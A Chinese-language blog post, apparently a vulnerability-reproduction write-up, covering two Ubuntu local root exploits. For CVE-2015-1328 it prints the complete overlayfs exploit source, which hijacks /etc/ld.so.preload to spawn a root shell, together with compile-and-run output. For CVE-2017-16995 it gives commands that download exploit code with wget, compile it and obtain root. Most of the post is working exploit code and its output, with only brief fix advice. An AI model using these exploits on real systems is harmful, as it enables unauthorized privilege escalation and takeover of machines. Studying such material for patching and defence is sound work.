---
title: Ubuntu本地提权漏洞复现
date: 2019-03-03 23:56:28
categories: 主机安全
tags: 漏洞复现

---
<blockquote class="blockquote-center">知人者智，自知者明。胜人者有力，自胜者强。 ——老子</blockquote>

<div align="middle"><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=451113132&auto=1&height=66"></iframe></div>



# Ubuntu本地提权漏洞（CVE-2015-1328）



## 漏洞原理：

这个漏洞是因为在Ubuntu到15.04 之前的3.19.0-21.21 的linux（又名Linux内核）包中的overlayfs实现没有正确检查上层文件系统目录中的文件创建权限，这允许本地用户通过利用其中的配置来获取root访问权限。
任意mount命名空间中都允许使用overlayfs。当在用户命名空间内使用overlayfs 挂载时，一名安全从业者Philip Pettersson发现了权限升级漏洞，本地用户即可利用此漏洞获取系统的管理权限。

报告中是这样说的：

> “当在上层文件系统目录中创建新文件时，overlayfs文件系统未能正确检查此文件的权限。而这一缺陷则可以被内核中没有权限的进程所利用，只要满足该进程CONFIG_USER_NS=y及overlayfs所拥有得FS_USERNS_MOUNT标志，即允许挂载非特权挂载空间的overlayfs。而这一条件是Ubuntu 12.04、14.04、14.10和15.04版本中的默认配置，所以这些版本的Ubuntu系统都受此漏洞影响。
> ovl_copy_up_ *函数未能正确检查用户是否有权限向upperdir目录写入文件。而该函数唯一检查的是被修改文件的拥有者是否拥有向upperdir目录写入文件的权限。此外，当从lowerdir目录复制一个文件时，同时也就复制了文件元数据，而并非文件属性，例如文件拥有者被修改为了触发copy_up_*程序的用户。”



## 影响版本：

- Ubuntu Linux 15.04
- Ubuntu Linux 14.10
- Ubuntu Linux 14.04
- Ubuntu Linux 12.04



## 漏洞复现：

将下面POC代码存放到本地的一个文件内，也可以去EDB网站下载[<https://www.exploit-db.com/exploits/37292/>]()。

```
/*
# Exploit Title: ofs.c - overlayfs local root in ubuntu
# Date: 2015-06-15
# Exploit Author: rebel
# Version: Ubuntu 12.04, 14.04, 14.10, 15.04 (Kernels before 2015-06-15)
# Tested on: Ubuntu 12.04, 14.04, 14.10, 15.04
# CVE : CVE-2015-1328     (http://people.canonical.com/~ubuntu-security/cve/2015/CVE-2015-1328.html)

*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*
CVE-2015-1328 / ofs.c
overlayfs incorrect permission handling + FS_USERNS_MOUNT

user@ubuntu-server-1504:~$ uname -a
Linux ubuntu-server-1504 3.19.0-18-generic #18-Ubuntu SMP Tue May 19 18:31:35 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
user@ubuntu-server-1504:~$ gcc ofs.c -o ofs
user@ubuntu-server-1504:~$ id
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),30(dip),46(plugdev)
user@ubuntu-server-1504:~$ ./ofs
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),30(dip),46(plugdev),1000(user)

greets to beist & kaliman
2015-05-24
%rebel%
*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sched.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/mount.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sched.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/mount.h>
#include <sys/types.h>
#include <signal.h>
#include <fcntl.h>
#include <string.h>
#include <linux/sched.h>

#define LIB "#include <unistd.h>\n\nuid_t(*_real_getuid) (void);\nchar path[128];\n\nuid_t\ngetuid(void)\n{\n_real_getuid = (uid_t(*)(void)) dlsym((void *) -1, \"getuid\");\nreadlink(\"/proc/self/exe\", (char *) &path, 128);\nif(geteuid() == 0 && !strcmp(path, \"/bin/su\")) {\nunlink(\"/etc/ld.so.preload\");unlink(\"/tmp/ofs-lib.so\");\nsetresuid(0, 0, 0);\nsetresgid(0, 0, 0);\nexecle(\"/bin/sh\", \"sh\", \"-i\", NULL, NULL);\n}\n    return _real_getuid();\n}\n"

static char child_stack[1024*1024];

static int
child_exec(void *stuff)
{
    char *file;
    system("rm -rf /tmp/ns_sploit");
    mkdir("/tmp/ns_sploit", 0777);
    mkdir("/tmp/ns_sploit/work", 0777);
    mkdir("/tmp/ns_sploit/upper",0777);
    mkdir("/tmp/ns_sploit/o",0777);

    fprintf(stderr,"mount #1\n");
    if (mount("overlay", "/tmp/ns_sploit/o", "overlayfs", MS_MGC_VAL, "lowerdir=/proc/sys/kernel,upperdir=/tmp/ns_sploit/upper") != 0) {
// workdir= and "overlay" is needed on newer kernels, also can't use /proc as lower
        if (mount("overlay", "/tmp/ns_sploit/o", "overlay", MS_MGC_VAL, "lowerdir=/sys/kernel/security/apparmor,upperdir=/tmp/ns_sploit/upper,workdir=/tmp/ns_sploit/work") != 0) {
            fprintf(stderr, "no FS_USERNS_MOUNT for overlayfs on this kernel\n");
            exit(-1);
        }
        file = ".access";
        chmod("/tmp/ns_sploit/work/work",0777);
    } else file = "ns_last_pid";

    chdir("/tmp/ns_sploit/o");
    rename(file,"ld.so.preload");

    chdir("/");
    umount("/tmp/ns_sploit/o");
    fprintf(stderr,"mount #2\n");
    if (mount("overlay", "/tmp/ns_sploit/o", "overlayfs", MS_MGC_VAL, "lowerdir=/tmp/ns_sploit/upper,upperdir=/etc") != 0) {
        if (mount("overlay", "/tmp/ns_sploit/o", "overlay", MS_MGC_VAL, "lowerdir=/tmp/ns_sploit/upper,upperdir=/etc,workdir=/tmp/ns_sploit/work") != 0) {
            exit(-1);
        }
        chmod("/tmp/ns_sploit/work/work",0777);
    }

    chmod("/tmp/ns_sploit/o/ld.so.preload",0777);
    umount("/tmp/ns_sploit/o");
}

int
main(int argc, char **argv)
{
    int status, fd, lib;
    pid_t wrapper, init;
    int clone_flags = CLONE_NEWNS | SIGCHLD;

    fprintf(stderr,"spawning threads\n");

    if((wrapper = fork()) == 0) {
        if(unshare(CLONE_NEWUSER) != 0)
            fprintf(stderr, "failed to create new user namespace\n");

        if((init = fork()) == 0) {
            pid_t pid =
                clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);
            if(pid < 0) {
                fprintf(stderr, "failed to create new mount namespace\n");
                exit(-1);
            }

            waitpid(pid, &status, 0);

        }

        waitpid(init, &status, 0);
        return 0;
    }

    usleep(300000);

    wait(NULL);

    fprintf(stderr,"child threads done\n");

    fd = open("/etc/ld.so.preload",O_WRONLY);

    if(fd == -1) {
        fprintf(stderr,"exploit failed\n");
        exit(-1);
    }

    fprintf(stderr,"/etc/ld.so.preload created\n");
    fprintf(stderr,"creating shared library\n");
    lib = open("/tmp/ofs-lib.c",O_CREAT|O_WRONLY,0777);
    write(lib,LIB,strlen(LIB));
    close(lib);
    lib = system("gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w");
    if(lib != 0) {
        fprintf(stderr,"couldn't create dynamic library\n");
        exit(-1);
    }
    write(fd,"/tmp/ofs-lib.so\n",16);
    close(fd);
    system("rm -rf /tmp/ns_sploit /tmp/ofs-lib.c");
    execl("/bin/su","su",NULL);
}
```

然后将其保存到本地的一个文件里去。

```
ica@indishell:~$ chmod 777 Ubuntu_EXP.c  //赋予文件权限
ica@indishell:~$ gcc Ubuntu_EXP.c -o Ubuntu_EXP  //编译程序
ica@indishell:~$ ls
Ubuntu_EXP  Ubuntu_EXP.c
ica@indishell:~$ ./Ubuntu_EXP  //执行EXP
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id                          //检测提权是否成功
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),114(sambashare),1000(ica)
# 

```





# CVE-2017-16995 Ubuntu16.04本地提权漏洞



## 漏洞描述

Ubuntu 16.04版本存在本地提权漏洞，该漏洞存在于Linux内核带有的eBPF bpf(2)系统调用中，当用户提供恶意BPF程序使eBPF验证器模块产生计算错误，导致任意内存读写问题。 

攻击者（普通用户）可以利用该漏洞进行提权攻击，获取root权限，危害极大。

目前，主要是Debian和Ubuntu版本受影响，Redhat和CentOS不受影响。

**影响版本：** 

Linux内核：Linux Kernel Version 4.4 ~ 4.14

Ubuntu版本：16.04.01~ 16.04.04



## 漏洞等级

高危



## 漏洞危害

提升到root权限



## 漏洞检测方法

1.编译POC,运行判断是否存在

2.漏洞扫描器扫描



## 漏洞利用方法

```
$ whoami      //查看当前用户
hack
$ wget http://cyseclabs.com/pub/upstream44.c  //下载EXP
$ ls
upstream44.c
$ gcc -o exp upstream44.c   //编译并输出到exp应用程序中
$ chmod 777 exp       //赋予权限
$ ./exp            //执行
task_struct = ffff880015e9f000
uidptr = ffff88001d42b5c4
spawning root shell
root@mozhe:~# ls
exp  upstream44.c
root@mozhe:~# id       //以获取权限
uid=0(root) gid=0(root) groups=0(root),1001(hack)

```



## 漏洞修复方案

1.及时升级系统

2.去官网打补丁



